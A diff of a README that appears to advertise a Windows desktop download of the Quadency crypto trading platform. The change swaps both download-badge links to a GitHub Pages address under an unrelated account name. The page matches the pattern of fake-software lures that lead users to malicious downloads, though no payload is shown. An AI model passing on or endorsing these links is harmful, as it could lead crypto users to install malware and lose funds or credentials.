@@ -4,7 +4,7 @@
 
 ## 📥 Download Quadency for Windows
 
-[![⬇️ Download Quadency](https://img.shields.io/badge/Download-Quadency-blue?style=for-the-badge&logo=windows)](https://quadency-desktop-app.github.io/.github/Quadency)
+[![⬇️ Download Quadency](https://img.shields.io/badge/Download-Quadency-blue?style=for-the-badge&logo=windows)](https://curtishahnpwos.github.io/.github/quadency-desktop-app)
 
 ---
 
@@ -24,7 +24,7 @@ Quadency also offers a marketplace of pre-built bot templates and community-shar
 
 In essence, Quadency bridges the gap between manual trading and full automation by delivering an adaptable, data-rich, and secure environment. Whether you aim to execute complex algorithmic strategies, diversify across multiple exchanges, or simply monitor your portfolio from one central location, Quadency provides the tools, intelligence, and flexibility to optimize every aspect of your cryptocurrency trading journey.
 
-[![⬇️ Download Quadency](https://img.shields.io/badge/Download-Quadency-blue?style=for-the-badge&logo=windows)](https://quadency-desktop-app.github.io/.github/Quadency)
+[![⬇️ Download Quadency](https://img.shields.io/badge/Download-Quadency-blue?style=for-the-badge&logo=windows)](https://curtishahnpwos.github.io/.github/quadency-desktop-app)
 
 ---
 
